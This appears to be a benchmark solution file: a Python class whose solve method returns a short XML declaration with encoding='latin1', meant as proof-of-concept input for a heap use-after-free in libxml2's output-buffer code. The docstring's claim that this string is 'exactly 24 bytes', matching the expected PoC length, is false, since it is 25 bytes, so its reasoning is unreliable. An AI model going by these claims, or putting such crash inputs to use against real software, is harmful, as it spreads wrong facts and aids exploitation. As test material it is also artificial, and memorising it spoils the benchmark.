import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        The vulnerability is a Heap Use After Free in xmlOutputBufferCreate/xmlAllocOutputBuffer.
        It is triggered when an encoding handler is loaded but not properly consumed/freed on error paths.
        The ground truth PoC is 24 bytes long.
        '<?xml encoding="latin1"?>' is exactly 24 bytes and sets a specific encoding that can trigger the issue.
        """
        return b'<?xml encoding="latin1"?>'
